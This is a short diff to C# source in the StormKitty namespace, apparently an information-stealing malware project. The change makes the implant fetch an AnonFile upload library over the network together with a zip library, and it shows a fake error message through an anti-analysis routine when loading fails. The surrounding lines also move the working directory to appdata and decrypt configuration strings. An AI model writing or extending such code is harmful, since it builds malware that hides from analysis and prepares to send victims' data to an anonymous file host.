@@ -46,8 +46,8 @@ namespace StormKitty
             // Change working directory to appdata
             System.IO.Directory.SetCurrentDirectory(Paths.InitWorkDir());
 
-            // Load SharpZipLib
-            if (!Libs.LoadRemoteLibrary(Libs.ZipLib))
+            // Load SharpZipLib and AnonFile api
+            if ((!Libs.LoadRemoteLibrary(Libs.ZipLib)) || (!Libs.LoadRemoteLibrary(Libs.AnonFile)))
                 Implant.AntiAnalysis.FakeErrorMessage();
 
             // Decrypt config strings
